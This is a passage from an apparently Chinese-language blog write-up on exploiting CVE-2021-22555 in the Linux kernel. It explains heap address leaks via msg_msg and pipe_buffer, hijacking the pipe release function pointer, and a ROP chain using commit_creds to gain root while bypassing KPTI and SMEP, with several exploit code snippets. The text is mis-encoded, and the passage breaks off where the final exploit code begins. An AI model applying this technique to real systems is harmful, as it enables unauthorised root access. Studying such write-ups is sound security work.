<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png" alt="image-20220513112451162"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¹å¤§å…¶<code>m_ts</code>åŸŸï¼Œå°±å¯ä»¥è¯»å–å‡ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯å¤´éƒ¨æŒ‡é’ˆ<code>struct list_head m_list.next</code>çš„å€¼ï¼Œä»è€Œæ³„éœ²æ¶ˆæ¯é˜Ÿåˆ—2çš„<code>msg_msg_queue</code>çš„<code>struct list_head m_list</code>åŸŸçš„åœ°å€ï¼Œä¸ºä¸€ä¸ªå †åœ°å€ã€‚</p>
<p>ä¹‹åæˆ‘ä»¬ä¿®æ”¹<code>fake_msg_msg</code>çš„<code>struct msg_msgseg *next</code>æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸Šè¿°è·å¾—çš„æ¶ˆæ¯é˜Ÿåˆ—2çš„<code>struct list_head m_list</code>åŸŸçš„åœ°å€ï¼Œå°±èƒ½è¯»å‡ºè¯¥<code>struct list_head m_list</code>åŸŸçš„<code>prev</code>æŒ‡é’ˆï¼Œå³ä¸ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå‡å»<code>0x400</code>å³ä¸º<code>UAF</code>å †å—çš„åœ°å€</p>

        <h3 id="2-æ³„éœ²å†…æ ¸åŸºåœ°å€"   >
          <a href="#2-æ³„éœ²å†…æ ¸åŸºåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³„éœ²å†…æ ¸åŸºåœ°å€" class="headerlink" title="(2)æ³„éœ²å†…æ ¸åŸºåœ°å€"></a>(2)æ³„éœ²å†…æ ¸åŸºåœ°å€</h3>
      <p>æ¥ä¸‹æ¥åˆ©ç”¨åˆ°<code>pipe</code>ç®¡é“ï¼Œä¸»è¦æ˜¯å…¶ä¸­<code>struct pipe_inode_info</code>çš„<code>struct pipe_buffer *bufs;</code>æ•°ç»„ï¼Œæ€»å¤§å°ä¸º<code>0x280</code>ï¼Œä½¿ç”¨<code>kmalloc-1024</code>ï¼Œæ»¡è¶³å½“å‰çš„<code>UAF</code>ï¼ˆåŒæ ·ä½¿ç”¨æ­£å¸¸çš„<code>read/write</code>å³å¯å®Œæˆç”³è¯·é‡Šæ”¾ï¼‰ã€‚å…¶ç»“æ„ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>åˆ©ç”¨å¦‚ä¸‹æ“ä½œè¯»å–<code>const struct pipe_buf_operations *ops;</code>æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€</p>
<ul>
<li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤<code>UAF</code>å¤„çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥<code>UAF</code>å¯¹è±¡é‡å› <code>slub</code>çš„<code>kmalloc-1024</code>çš„<code>freelist</code>ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥<code>UAF</code>å¯¹è±¡</li>
<li>å–·å°„ <code>pipe_buffer</code>ï¼Œå°±ä¼šå°†è¯¥<code>UAF</code>å¯¹è±¡ç”³è¯·å›æ¥ï¼Œå°†<code>pipe_buffer</code>å†™å…¥åˆ°è¯¥<code>UAF</code>å¯¹è±¡ä¸Šï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œå³å¯è·å–<code>pipe_buffer</code>ä¸Šçš„æ•°æ®ï¼Œå¾—åˆ°<code>const struct pipe_buf_operations *ops;</code>æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png" alt="image-20220513115154194"></p>

        <h3 id="3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ"   >
          <a href="#3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ«æŒç¨‹åºæ‰§è¡Œæµ" class="headerlink" title="(3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ"></a>(3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ</h3>
      <p>ä¹‹å‰ä¹Ÿæåˆ°è¿‡ï¼Œå½“æˆ‘ä»¬å…³é—­ç®¡é“<code>pipe</code>ä¸¤ç«¯æˆ–è€…ä»ç®¡é“<code>pipe</code>ä¸­è¯»å–å‡ºæ‰€æœ‰æ•°æ®ä¹‹åï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_buf_release()</code>å‡½æ•°è¿›è¡Œæ¸…ç†ï¼Œå…¶ä¸­ä¼šè°ƒç”¨<code>struct pipe_buffer *bufs;</code>ä¸‹çš„<code>const struct pipe_buf_operations *ops;</code>å¯¹åº”å‡½æ•°è¡¨ä¸­çš„<code>release</code>å‡½æ•°æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>sk_buff</code>æ¥åŠ«æŒåŠ«æŒ<code>ops</code>æŒ‡é’ˆå‡½æ•°è¡¨ï¼Œä¿®æ”¹å…¶ä¸­çš„<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œå®ŒæˆåŠ«æŒç¨‹åºæµã€‚å¹¶ä¸”æ­¤æ—¶çš„<code>rsi</code>å³ä¸º<code>buf</code>ä¸ºæˆ‘ä»¬çš„<code>UAF</code>å¯¹è±¡ï¼Œè€Œ<code>sk_buff</code>åˆå¯ä»¥ä½¿å¾—<code>UAF</code>å¯¹è±¡é‡Œçš„æ•°æ®å®Œå…¨å¯æ§ã€‚å¦‚æœæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°†<code>rsp</code>åŠ«æŒä¸º<code>rsi</code>çš„<code>gadget</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œå…¨æ“æ§ç¨‹åºæµç¨‹äº†ã€‚</p>

        <h2 id="3-EXPè§£æ"   >
          <a href="#3-EXPè§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXPè§£æ" class="headerlink" title="3.EXPè§£æ"></a>3.EXPè§£æ</h2>
      <p>è¿™ä¸ªå…¶å®ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®²çš„ï¼Œçœ‹æ‡‚æ¼æ´åˆ©ç”¨è¿‡ç¨‹å…¶å®ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºæ¥çš„ï¼Œä¸»è¦æä¸€ä¸‹æŸäº›æ¯”è¾ƒåçš„çŸ¥è¯†ç‚¹ï¼Œä¹Ÿé˜²æ­¢å¿˜è®°ã€‚</p>

        <h3 id="1-ç»‘å®šCPUåˆ†é…"   >
          <a href="#1-ç»‘å®šCPUåˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç»‘å®šCPUåˆ†é…" class="headerlink" title="(1)ç»‘å®šCPUåˆ†é…"></a>(1)ç»‘å®šCPUåˆ†é…</h3>
      <p>é€šå¸¸æ˜¯ç”¨æ¥è¿›è¡Œå †å—åˆ†é…æ—¶æŸ¥çœ‹å †å—å†…å­˜çš„ï¼Œé˜²æ­¢å †å—ç”³è¯·çš„æ—¶å€™ä¸œä¸€ä¸ªè¥¿ä¸€ä¸ªçš„ï¼Œæ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†æé«˜å †å–·å°„çš„ç¨³å®šæ€§</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind the cpu0</span></span><br><span class="line"><span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å‘½åç©ºé—´"   >
          <a href="#2-å‘½åç©ºé—´" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‘½åç©ºé—´" class="headerlink" title="(2)å‘½åç©ºé—´"></a>(2)å‘½åç©ºé—´</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>EXP</code>åŸä½œè€…ç§°ï¼šå½“<code>IPT_SO_SET_REPLACE</code>æˆ–<code>IP6T_SO_SET_REPLACE</code>åœ¨å…¼å®¹æ¨¡å¼ä¸‹è¢«è°ƒç”¨æ—¶ï¼ˆéœ€è¦<code>CAP_NET_ADMIN</code>æƒé™ï¼‰ã€‚</p>
<p>è¿™ä¸ªåœ¨æºä»£ç <code>do_ipt_set_ctl()</code>å‡½æ•°ä¸­æœ‰æ‰€ä½“ç°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_ipt_set_ctl</span><span class="params">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="comment">//æåˆ°å½“å…¼å®¹æ¨¡å¼ä¸‹éœ€è¦CAP_NET_ADMINæƒé™</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è€Œç”¨æˆ·ç©ºé—´éš”ç¦»å‡ºç‹¬ç«‹çš„å‘½åç©ºé—´åå°±èƒ½æ‹¥æœ‰<code>CAP_NET_ADMIN</code>æƒé™ï¼Œæ‰€ä»¥éœ€è¦ï¼Œå…¶å®ä¹Ÿä¸æ˜¯å¤ªæ‡‚è¿™ä¸ªå¹²å•¥çš„ã€‚</p>
<p>å…¶ä»–çš„å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆäº†ï¼Œå°±æ˜¯æœ€åçš„<code>ROP</code>é“¾æ¡æ–¹é¢çš„ä¸œè¥¿ï¼Œç”±äºæœ€åè§¦å‘åŠ«æŒç¨‹åºæµçš„æ—¶å€™ï¼Œ<code>rsi</code>ä¸º<code>UAF</code>å¯¹è±¡åœ°å€ï¼Œæ‰€ä»¥åˆ©ç”¨<code>gadget</code>å…ˆè¿›è¡Œæ ˆåŠ«æŒ<code>rsp</code>ï¼Œç„¶åä½¿ç”¨åˆ©ç”¨<code>commit_creds(&amp;init_cred)</code>è·å–ROOTæƒé™ï¼Œä¹‹åä½¿ç”¨<code>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</code>ç»•è¿‡<code>KPTI</code>å’Œ<code>SMEP</code>å³å¯ã€‚</p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-æœ€ç»ˆEXP"   >
          <a href="#3-æœ€ç»ˆEXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æœ€ç»ˆEXP" class="headerlink" title="(3)æœ€ç»ˆEXP"></a>(3)æœ€ç»ˆEXP</h3>
      <p>ä¸»è¦æ˜¯<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory" >bsauceå¸ˆå‚…çš„EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>å’Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >arttnba3å¸ˆå‚…çš„EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œç„¶åæ”¹å·´æ”¹å·´ï¼ŒåŠ äº†ç‚¹ä¸œè¥¿ï¼Œæ›¿æ¢äº†ä¸€ä¸‹ROPé“¾æ¡ä»€ä¹ˆçš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span 